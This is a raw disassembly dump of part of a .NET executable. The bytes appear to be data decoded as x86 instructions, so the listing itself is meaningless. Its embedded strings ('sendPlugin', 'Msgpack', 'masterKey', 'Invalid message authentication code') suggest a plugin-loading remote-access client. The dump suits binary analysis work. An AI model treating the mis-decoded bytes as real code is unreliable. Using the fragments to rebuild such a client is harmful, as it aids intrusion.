  40bc0b:	6c                   	insb   (%dx),%es:(%edi)
  40bc0c:	00 75 00             	add    %dh,0x0(%ebp)
  40bc0f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bc13:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc14:	00 00                	add    %al,(%eax)
  40bc16:	07                   	pop    %es
  40bc17:	44                   	inc    %esp
  40bc18:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bc1c:	00 00                	add    %al,(%eax)
  40bc1e:	15 73 00 65 00       	adc    $0x650073,%eax
  40bc23:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc24:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bc28:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc2c:	00 67 00             	add    %ah,0x0(%edi)
  40bc2f:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bc35:	48                   	dec    %eax
  40bc36:	00 61 00             	add    %ah,0x0(%ecx)
  40bc39:	73 00                	jae    0x40bc3b
  40bc3b:	68 00 65 00 73       	push   $0x73006500
  40bc40:	00 00                	add    %al,(%eax)
  40bc42:	09 48 00             	or     %ecx,0x0(%eax)
  40bc45:	61                   	popa
  40bc46:	00 73 00             	add    %dh,0x0(%ebx)
  40bc49:	68 00 00 1b 50       	push   $0x501b0000
  40bc4e:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc52:	00 67 00             	add    %ah,0x0(%edi)
  40bc55:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bc5b:	50                   	push   %eax
  40bc5c:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc60:	00 67 00             	add    %ah,0x0(%edi)
  40bc63:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bc69:	52                   	push   %edx
  40bc6a:	00 75 00             	add    %dh,0x0(%ebp)
  40bc6d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc6e:	00 00                	add    %al,(%eax)
  40bc70:	0f 4d 00             	cmovge (%eax),%eax
  40bc73:	73 00                	jae    0x40bc75
  40bc75:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bc79:	61                   	popa
  40bc7a:	00 63 00             	add    %ah,0x0(%ebx)
  40bc7d:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bc80:	11 52 00             	adc    %edx,0x0(%edx)
  40bc83:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bc87:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bc8b:	76 00                	jbe    0x40bc8d
  40bc8d:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bc92:	0b 45 00             	or     0x0(%ebp),%eax
  40bc95:	72 00                	jb     0x40bc97
  40bc97:	72 00                	jb     0x40bc99
  40bc99:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc9a:	00 72 00             	add    %dh,0x0(%edx)
  40bc9d:	00 47 6d             	add    %al,0x6d(%edi)
  40bca0:	00 61 00             	add    %ah,0x0(%ecx)
  40bca3:	73 00                	jae    0x40bca5
  40bca5:	74 00                	je     0x40bca7
  40bca7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bcab:	4b                   	dec    %ebx
  40bcac:	00 65 00             	add    %ah,0x0(%ebp)
  40bcaf:	79 00                	jns    0x40bcb1
  40bcb1:	20 00                	and    %al,(%eax)
  40bcb3:	63 00                	arpl   %eax,(%eax)
  40bcb5:	61                   	popa
  40bcb6:	00 6e 00             	add    %ch,0x0(%esi)
  40bcb9:	20 00                	and    %al,(%eax)
  40bcbb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcbc:	00 6f 00             	add    %ch,0x0(%edi)
  40bcbf:	74 00                	je     0x40bcc1
  40bcc1:	20 00                	and    %al,(%eax)
  40bcc3:	62 00                	bound  %eax,(%eax)
  40bcc5:	65 00 20             	add    %ah,%gs:(%eax)
  40bcc8:	00 6e 00             	add    %ch,0x0(%esi)
  40bccb:	75 00                	jne    0x40bccd
  40bccd:	6c                   	insb   (%dx),%es:(%edi)
  40bcce:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bcd2:	00 6f 00             	add    %ch,0x0(%edi)
  40bcd5:	72 00                	jb     0x40bcd7
  40bcd7:	20 00                	and    %al,(%eax)
  40bcd9:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bcdd:	70 00                	jo     0x40bcdf
  40bcdf:	74 00                	je     0x40bce1
  40bce1:	79 00                	jns    0x40bce3
  40bce3:	2e 00 00             	add    %al,%cs:(%eax)
  40bce6:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bceb:	70 00                	jo     0x40bced
  40bced:	75 00                	jne    0x40bcef
  40bcef:	74 00                	je     0x40bcf1
  40bcf1:	20 00                	and    %al,(%eax)
  40bcf3:	63 00                	arpl   %eax,(%eax)
  40bcf5:	61                   	popa
  40bcf6:	00 6e 00             	add    %ch,0x0(%esi)
  40bcf9:	20 00                	and    %al,(%eax)
  40bcfb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcfc:	00 6f 00             	add    %ch,0x0(%edi)
  40bcff:	74 00                	je     0x40bd01
  40bd01:	20 00                	and    %al,(%eax)
  40bd03:	62 00                	bound  %eax,(%eax)
  40bd05:	65 00 20             	add    %ah,%gs:(%eax)
  40bd08:	00 6e 00             	add    %ch,0x0(%esi)
  40bd0b:	75 00                	jne    0x40bd0d
  40bd0d:	6c                   	insb   (%dx),%es:(%edi)
  40bd0e:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bd12:	00 00                	add    %al,(%eax)
  40bd14:	55                   	push   %ebp
  40bd15:	49                   	dec    %ecx
  40bd16:	00 6e 00             	add    %ch,0x0(%esi)
  40bd19:	76 00                	jbe    0x40bd1b
  40bd1b:	61                   	popa
  40bd1c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bd20:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bd24:	00 6d 00             	add    %ch,0x0(%ebp)
  40bd27:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bd2b:	73 00                	jae    0x40bd2d
  40bd2d:	61                   	popa
  40bd2e:	00 67 00             	add    %ah,0x0(%edi)
  40bd31:	65 00 20             	add    %ah,%gs:(%eax)
  40bd34:	00 61 00             	add    %ah,0x0(%ecx)
  40bd37:	75 00                	jne    0x40bd39
  40bd39:	74 00                	je     0x40bd3b
  40bd3b:	68 00 65 00 6e       	push   $0x6e006500
  40bd40:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd44:	00 63 00             	add    %ah,0x0(%ebx)
  40bd47:	61                   	popa
  40bd48:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd4c:	00 6f 00             	add    %ch,0x0(%edi)
  40bd4f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd50:	00 20                	add    %ah,(%eax)
  40bd52:	00 63 00             	add    %ah,0x0(%ebx)
  40bd55:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd56:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bd5a:	00 20                	add    %ah,(%eax)
  40bd5c:	00 28                	add    %ch,(%eax)
  40bd5e:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd61:	41                   	inc    %ecx
  40bd62:	00 43 00             	add    %al,0x0(%ebx)
  40bd65:	29 00                	sub    %eax,(%eax)
  40bd67:	2e 00 00             	add    %al,%cs:(%eax)
  40bd6a:	05 58 00 32 00       	add    $0x320058,%eax
  40bd6f:	00 0f                	add    %cl,(%edi)
  40bd71:	7b 00                	jnp    0x40bd73
  40bd73:	30 00                	xor    %al,(%eax)
  40bd75:	3a 00                	cmp    (%eax),%al
  40bd77:	44                   	inc    %esp
  40bd78:	00 33                	add    %dh,(%ebx)
  40bd7a:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd7d:	20 00                	and    %al,(%eax)
  40bd7f:	00 0f                	add    %cl,(%edi)
  40bd81:	7b 00                	jnp    0x40bd83
  40bd83:	30 00                	xor    %al,(%eax)
  40bd85:	3a 00                	cmp    (%eax),%al
  40bd87:	58                   	pop    %eax
  40bd88:	00 32                	add    %dh,(%edx)
  40bd8a:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd8d:	20 00                	and    %al,(%eax)
  40bd8f:	00 2b                	add    %ch,(%ebx)
  40bd91:	28 00                	sub    %al,(%eax)
  40bd93:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd94:	00 65 00             	add    %ah,0x0(%ebp)
  40bd97:	76 00                	jbe    0x40bd99
  40bd99:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd9d:	20 00                	and    %al,(%eax)
  40bd9f:	75 00                	jne    0x40bda1
  40bda1:	73 00                	jae    0x40bda3
  40bda3:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bda8:	00 20                	add    %ah,(%eax)
  40bdaa:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bdae:	00 70 00             	add    %dh,0x0(%eax)
  40bdb1:	65 00 20             	add    %ah,%gs:(%eax)
  40bdb4:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bdb7:	63 00                	arpl   %eax,(%eax)
  40bdb9:	31 00                	xor    %eax,(%eax)
  40bdbb:	00 45 28             	add    %al,0x28(%ebp)
  40bdbe:	00 65 00             	add    %ah,0x0(%ebp)
  40bdc1:	78 00                	js     0x40bdc3
  40bdc3:	74 00                	je     0x40bdc5
  40bdc5:	38 00                	cmp    %al,(%eax)
  40bdc7:	2c 00                	sub    $0x0,%al
  40bdc9:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bdcd:	74 00                	je     0x40bdcf
  40bdcf:	31 00                	xor    %eax,(%eax)
  40bdd1:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bdd5:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bdd9:	33 00                	xor    (%eax),%eax
  40bddb:	32 00                	xor    (%eax),%al
  40bddd:	29 00                	sub    %eax,(%eax)
  40bddf:	20 00                	and    %al,(%eax)
  40bde1:	74 00                	je     0x40bde3
  40bde3:	79 00                	jns    0x40bde5
  40bde5:	70 00                	jo     0x40bde7
  40bde7:	65 00 20             	add    %ah,%gs:(%eax)
  40bdea:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bded:	63 00                	arpl   %eax,(%eax)
  40bdef:	37                   	aaa
  40bdf0:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bdf3:	24 00                	and    $0x0,%al
  40bdf5:	63 00                	arpl   %eax,(%eax)
  40bdf7:	38 00                	cmp    %al,(%eax)
  40bdf9:	2c 00                	sub    $0x0,%al
  40bdfb:	24 00                	and    $0x0,%al
  40bdfd:	63 00                	arpl   %eax,(%eax)
  40bdff:	39 00                	cmp    %eax,(%eax)
  40be01:	00 00                	add    %al,(%eax)
  40be03:	00 14 74             	add    %dl,(%esp,%esi,2)
  40be06:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40be0a:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40be0d:	24 f5                	and    $0xf5,%al
  40be0f:	ac                   	lods   %ds:(%esi),%al
  40be10:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40be17:	7a 5c                	jp     0x40be75
  40be19:	56                   	push   %esi
  40be1a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40be1d:	89 03                	mov    %eax,(%ebx)
  40be1f:	00 00                	add    %al,(%eax)
  40be21:	01 03                	add    %eax,(%ebx)
  40be23:	20 00                	and    %al,(%eax)
  40be25:	01 02                	add    %eax,(%edx)
  40be27:	06                   	push   %es
  40be28:	0e                   	push   %cs
  40be29:	03 06                	add    (%esi),%eax
  40be2b:	12 09                	adc    (%ecx),%cl
  40be2d:	03 06                	add    (%esi),%eax
  40be2f:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40be33:	00 02                	add    %al,(%edx)
  40be35:	03 06                	add    (%esi),%eax
  40be37:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40be3d:	03 06                	add    (%esi),%eax
  40be3f:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40be44:	03 06                	add    (%esi),%eax
  40be46:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40be4c:	06                   	push   %es
  40be4d:	1c 02                	sbb    $0x2,%al
  40be4f:	06                   	push   %es
  40be50:	08 04 00             	or     %al,(%eax,%eax,1)
  40be53:	00 12                	add    %dl,(%edx)
  40be55:	0d 05 00 01 01       	or     $0x1010005,%eax
  40be5a:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40be60:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40be66:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be69:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40be6f:	01 1d 05 03 00 00    	add    %ebx,0x305
  40be75:	0a 04 00             	or     (%eax,%eax,1),%al
  40be78:	01 01                	add    %eax,(%ecx)
  40be7a:	0a 04 00             	or     (%eax,%eax,1),%al
  40be7d:	00 12                	add    %dl,(%edx)
  40be7f:	15 05 00 01 01       	adc    $0x1010005,%eax
  40be84:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40be8a:	02 03                	add    (%ebx),%al
  40be8c:	00 00                	add    %al,(%eax)
  40be8e:	1c 03                	sbb    $0x3,%al
  40be90:	00 00                	add    %al,(%eax)
  40be92:	08 04 00             	or     %al,(%eax,%eax,1)
  40be95:	01 01                	add    %eax,(%ecx)
  40be97:	08 04 00             	or     %al,(%eax,%eax,1)
  40be9a:	01 02                	add    %eax,(%edx)
  40be9c:	0e                   	push   %cs
  40be9d:	0a 00                	or     (%eax),%al
  40be9f:	04 02                	add    $0x2,%al
  40bea1:	1c 12                	sbb    $0x12,%al
  40bea3:	19 12                	sbb    %edx,(%edx)
  40bea5:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40beaa:	01 01                	add    %eax,(%ecx)
  40beac:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40beb2:	1c 04                	sbb    $0x4,%al
  40beb4:	08 00                	or     %al,(%eax)
  40beb6:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40bebc:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40bebf:	00 1d 05 03 08 00    	add    %bl,0x80305
  40bec5:	0a 04 08             	or     (%eax,%ecx,1),%al
  40bec8:	00 12                	add    %dl,(%edx)
  40beca:	15 03 08 00 02       	adc    $0x2000803,%eax
  40becf:	03 08                	add    (%eax),%ecx
  40bed1:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bed4:	08 00                	or     %al,(%eax)
  40bed6:	08 03                	or     %al,(%ebx)
  40bed8:	00 00                	add    %al,(%eax)
  40beda:	0e                   	push   %cs
  40bedb:	04 00                	add    $0x0,%al
  40bedd:	01 0e                	add    %ecx,(%esi)
  40bedf:	0e                   	push   %cs
  40bee0:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40bee6:	d5 0a                	aad    $0xa
  40bee8:	3a 06                	cmp    (%esi),%al
  40beea:	00 01                	add    %al,(%ecx)
  40beec:	12 29                	adc    (%ecx),%ch
  40beee:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40bef4:	03 00                	add    (%eax),%eax
  40bef6:	00 18                	add    %bl,(%eax)
  40bef8:	07                   	pop    %es
  40bef9:	00 03                	add    %al,(%ebx)
  40befb:	08 18                	or     %bl,(%eax)
  40befd:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40bf03:	18 0e                	sbb    %cl,(%esi)
  40bf05:	06                   	push   %es
  40bf06:	00 02                	add    %al,(%edx)
  40bf08:	02 18                	add    (%eax),%bl
  40bf0a:	10 02                	adc    %al,(%edx)
  40bf0c:	06                   	push   %es
  40bf0d:	00 01                	add    %al,(%ecx)
  40bf0f:	11 30                	adc    %esi,(%eax)
  40bf11:	11 30                	adc    %esi,(%eax)
  40bf13:	06                   	push   %es
  40bf14:	00 03                	add    %al,(%ebx)
  40bf16:	01 09                	add    %ecx,(%ecx)
  40bf18:	09 09                	or     %ecx,(%ecx)
  40bf1a:	02 06                	add    (%esi),%al
  40bf1c:	09 03                	or     %eax,(%ebx)
  40bf1e:	06                   	push   %es
  40bf1f:	11 30                	adc    %esi,(%eax)
  40bf21:	04 00                	add    $0x0,%al
  40bf23:	00 00                	add    %al,(%eax)
  40bf25:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bf29:	00 00                	add    %al,(%eax)
  40bf2b:	04 01                	add    $0x1,%al
  40bf2d:	00 00                	add    %al,(%eax)
  40bf2f:	00 06                	add    %al,(%esi)
  40bf31:	00 02                	add    %al,(%edx)
  40bf33:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bf36:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bf3b:	0e                   	push   %cs
  40bf3c:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf41:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40bf46:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf4b:	60                   	pusha
  40bf4c:	05 00 01 01 12       	add    $0x12010100,%eax
  40bf51:	60                   	pusha
  40bf52:	04 00                	add    $0x0,%al
  40bf54:	01 01                	add    %eax,(%ecx)
  40bf56:	0e                   	push   %cs
  40bf57:	18 06                	sbb    %al,(%esi)
  40bf59:	15 12 45 01 15       	adc    $0x15014512,%eax
  40bf5e:	12 49 0a             	adc    0xa(%ecx),%cl
  40bf61:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bf64:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bf6a:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bf6f:	0e                   	push   %cs
  40bf70:	04 20                	add    $0x20,%al
  40bf72:	00 00                	add    %al,(%eax)
  40bf74:	00 04 40             	add    %al,(%eax,%eax,2)
  40bf77:	00 00                	add    %al,(%eax)
  40bf79:	00 04 10             	add    %al,(%eax,%edx,1)
  40bf7c:	00 00                	add    %al,(%eax)
  40bf7e:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bf81:	01 01                	add    %eax,(%ecx)
  40bf83:	0e                   	push   %cs
  40bf84:	04 20                	add    $0x20,%al
  40bf86:	01 0e                	add    %ecx,(%esi)
  40bf88:	0e                   	push   %cs
  40bf89:	06                   	push   %es
  40bf8a:	20 01                	and    %al,(%ecx)
  40bf8c:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bf91:	20 02                	and    %al,(%edx)
  40bf93:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bf99:	00 01                	add    %al,(%ecx)
  40bf9b:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bfa0:	06                   	push   %es
  40bfa1:	11 50 03             	adc    %edx,0x3(%eax)
  40bfa4:	06                   	push   %es
  40bfa5:	12 55 05             	adc    0x5(%ebp),%dl
  40bfa8:	00 01                	add    %al,(%ecx)
  40bfaa:	0e                   	push   %cs
  40bfab:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bfb0:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bfb5:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bfbb:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bfc1:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bfc7:	01 01                	add    %eax,(%ecx)
  40bfc9:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bfce:	60                   	pusha
  40bfcf:	03 20                	add    (%eax),%esp
  40bfd1:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bfd4:	20 00                	and    %al,(%eax)
  40bfd6:	02 03                	add    (%ebx),%al
  40bfd8:	28 00                	sub    %al,(%eax)
  40bfda:	1c 03                	sbb    $0x3,%al
  40bfdc:	06                   	push   %es
  40bfdd:	12 60 0b             	adc    0xb(%eax),%ah
  40bfe0:	20 02                	and    %al,(%edx)
  40bfe2:	01 12                	add    %edx,(%edx)
  40bfe4:	60                   	pusha
  40bfe5:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bfea:	60                   	pusha
  40bfeb:	04 20                	add    $0x20,%al
  40bfed:	00 12                	add    %dl,(%edx)
  40bfef:	60                   	pusha
  40bff0:	05 20 01 12 60       	add    $0x60120120,%eax
  40bff5:	0e                   	push   %cs
  40bff6:	05 20 01 12 60       	add    $0x60120120,%eax
  40bffb:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c001:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c006:	60                   	pusha
  40c007:	08 03                	or     %al,(%ebx)
  40c009:	20 00                	and    %al,(%eax)
  40c00b:	08 05 28 01 12 60    	or     %al,0x60120128
  40c011:	08 03                	or     %al,(%ebx)
  40c013:	28 00                	sub    %al,(%eax)
  40c015:	08 03                	or     %al,(%ebx)
  40c017:	06                   	push   %es
  40c018:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c01c:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c020:	01 08                	add    %ecx,(%eax)
  40c022:	0e                   	push   %cs
  40c023:	05 20 01 01 12       	add    $0x12010120,%eax
  40c028:	61                   	popa
  40c029:	04 20                	add    $0x20,%al
  40c02b:	01 01                	add    %eax,(%ecx)
  40c02d:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c030:	01 01                	add    %eax,(%ecx)
  40c032:	0b 03                	or     (%ebx),%eax
  40c034:	20 00                	and    %al,(%eax)
  40c036:	0b 03                	or     (%ebx),%eax
  40c038:	20 00                	and    %al,(%eax)
  40c03a:	0a 03                	or     (%ebx),%al
  40c03c:	20 00                	and    %al,(%eax)
  40c03e:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c043:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c048:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c04d:	01 0e                	add    %ecx,(%esi)
  40c04f:	0e                   	push   %cs
  40c050:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c055:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c058:	01 02                	add    %eax,(%edx)
  40c05a:	0e                   	push   %cs
  40c05b:	03 20                	add    (%eax),%esp
  40c05d:	00 0e                	add    %cl,(%esi)
  40c05f:	04 20                	add    $0x20,%al
  40c061:	01 01                	add    %eax,(%ecx)
  40c063:	02 04 20             	add    (%eax,%eiz,1),%al
  40c066:	01 01                	add    %eax,(%ecx)
  40c068:	0c 04                	or     $0x4,%al
  40c06a:	20 01                	and    %al,(%ecx)
  40c06c:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c072:	5c                   	pop    %esp
  40c073:	04 20                	add    $0x20,%al
  40c075:	00 11                	add    %dl,(%ecx)
  40c077:	64 04 20             	fs add $0x20,%al
  40c07a:	00 12                	add    %dl,(%edx)
  40c07c:	59                   	pop    %ecx
  40c07d:	03 28                	add    (%eax),%ebp
  40c07f:	00 0e                	add    %cl,(%esi)
  40c081:	03 28                	add    (%eax),%ebp
  40c083:	00 0a                	add    %cl,(%edx)
  40c085:	03 28                	add    (%eax),%ebp
  40c087:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c08d:	5c                   	pop    %esp
  40c08e:	04 28                	add    $0x28,%al
  40c090:	00 11                	add    %dl,(%ecx)
  40c092:	64 04 00             	fs add $0x0,%al
  40c095:	00 00                	add    %al,(%eax)
  40c097:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c09a:	00 00                	add    %al,(%eax)
  40c09c:	00 04 04             	add    %al,(%esp,%eax,1)
  40c09f:	00 00                	add    %al,(%eax)
  40c0a1:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c0a8:	06                   	push   %es
  40c0a9:	00 00                	add    %al,(%eax)
  40c0ab:	00 04 07             	add    %al,(%edi,%eax,1)
  40c0ae:	00 00                	add    %al,(%eax)
  40c0b0:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c0b3:	00 00                	add    %al,(%eax)
  40c0b5:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c0b8:	00 00                	add    %al,(%eax)
  40c0ba:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c0bd:	00 00                	add    %al,(%eax)
  40c0bf:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c0c2:	00 00                	add    %al,(%eax)
  40c0c4:	00 06                	add    %al,(%esi)
  40c0c6:	00 02                	add    %al,(%edx)
  40c0c8:	0e                   	push   %cs
  40c0c9:	12 61 08             	adc    0x8(%ecx),%ah
  40c0cc:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c0d1:	61                   	popa
  40c0d2:	06                   	push   %es
  40c0d3:	00 02                	add    %al,(%edx)
  40c0d5:	0e                   	push   %cs
  40c0d6:	05 12 61 05 00       	add    $0x56112,%eax
  40c0db:	01 01                	add    %eax,(%ecx)
  40c0dd:	12 61 06             	adc    0x6(%ecx),%ah
  40c0e0:	00 02                	add    %al,(%edx)
  40c0e2:	01 12                	add    %edx,(%edx)
  40c0e4:	61                   	popa
  40c0e5:	0e                   	push   %cs
  40c0e6:	07                   	pop    %es
  40c0e7:	00 02                	add    %al,(%edx)
  40c0e9:	01 12                	add    %edx,(%edx)
  40c0eb:	61                   	popa
  40c0ec:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c0f1:	01 12                	add    %edx,(%edx)
  40c0f3:	61                   	popa
  40c0f4:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c0f9:	12 61 0c             	adc    0xc(%ecx),%ah
  40c0fc:	06                   	push   %es
  40c0fd:	00 02                	add    %al,(%edx)
  40c0ff:	01 12                	add    %edx,(%edx)
  40c101:	61                   	popa
  40c102:	02 06                	add    (%esi),%al
  40c104:	00 02                	add    %al,(%edx)
  40c106:	01 12                	add    %edx,(%edx)
  40c108:	61                   	popa
  40c109:	0b 06                	or     (%esi),%eax
  40c10b:	00 02                	add    %al,(%edx)
  40c10d:	01 12                	add    %edx,(%edx)
  40c10f:	61                   	popa
  40c110:	0a 03                	or     (%ebx),%al
  40c112:	06                   	push   %es
  40c113:	11 78 04             	adc    %edi,0x4(%eax)
  40c116:	20 01                	and    %al,(%ecx)
  40c118:	01 08                	add    %ecx,(%eax)
  40c11a:	08 01                	or     %al,(%ecx)
  40c11c:	00 08                	add    %cl,(%eax)
  40c11e:	00 00                	add    %al,(%eax)
  40c120:	00 00                	add    %al,(%eax)
  40c122:	00 1e                	add    %bl,(%esi)
  40c124:	01 00                	add    %eax,(%eax)
  40c126:	01 00                	add    %eax,(%eax)
  40c128:	54                   	push   %esp
  40c129:	02 16                	add    (%esi),%dl
  40c12b:	57                   	push   %edi
  40c12c:	72 61                	jb     0x40c18f
  40c12e:	70 4e                	jo     0x40c17e
  40c130:	6f                   	outsl  %ds:(%esi),(%dx)
  40c131:	6e                   	outsb  %ds:(%esi),(%dx)
  40c132:	45                   	inc    %ebp
  40c133:	78 63                	js     0x40c198
  40c135:	65 70 74             	gs jo  0x40c1ac
  40c138:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c13f:	77 73                	ja     0x40c1b4
  40c141:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c147:	71 08                	jno    0x40c151
  40c149:	01 00                	add    %eax,(%eax)
  40c14b:	02 00                	add    (%eax),%al
  40c14d:	00 00                	add    %al,(%eax)
  40c14f:	00 00                	add    %al,(%eax)
  40c151:	05 01 00 00 00       	add    $0x1,%eax
  40c156:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c159:	00 07                	add    %al,(%edi)
  40c15b:	31 2e                	xor    %ebp,(%esi)
  40c15d:	30 2e                	xor    %ch,(%esi)
  40c15f:	30 2e                	xor    %ch,(%esi)
  40c161:	30 00                	xor    %al,(%eax)
  40c163:	00 65 01             	add    %ah,0x1(%ebp)
  40c166:	00 29                	add    %ch,(%ecx)
  40c168:	2e 4e                	cs dec %esi
  40c16a:	45                   	inc    %ebp
  40c16b:	54                   	push   %esp
  40c16c:	46                   	inc    %esi
  40c16d:	72 61                	jb     0x40c1d0
  40c16f:	6d                   	insl   (%dx),%es:(%edi)
  40c170:	65 77 6f             	gs ja  0x40c1e2
  40c173:	72 6b                	jb     0x40c1e0
  40c175:	2c 56                	sub    $0x56,%al
  40c177:	65 72 73             	gs jb  0x40c1ed
  40c17a:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c181:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c184:	72 6f                	jb     0x40c1f5
  40c186:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c18d:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c194:	0e                   	push   %cs
  40c195:	14 46                	adc    $0x46,%al
  40c197:	72 61                	jb     0x40c1fa
  40c199:	6d                   	insl   (%dx),%es:(%edi)
  40c19a:	65 77 6f             	gs ja  0x40c20c
  40c19d:	72 6b                	jb     0x40c20a
  40c19f:	44                   	inc    %esp
  40c1a0:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c1a7:	61                   	popa
  40c1a8:	6d                   	insl   (%dx),%es:(%edi)
  40c1a9:	65 1f                	gs pop %ds
  40c1ab:	2e 4e                	cs dec %esi
  40c1ad:	45                   	inc    %ebp
  40c1ae:	54                   	push   %esp
  40c1af:	20 46 72             	and    %al,0x72(%esi)
  40c1b2:	61                   	popa
  40c1b3:	6d                   	insl   (%dx),%es:(%edi)
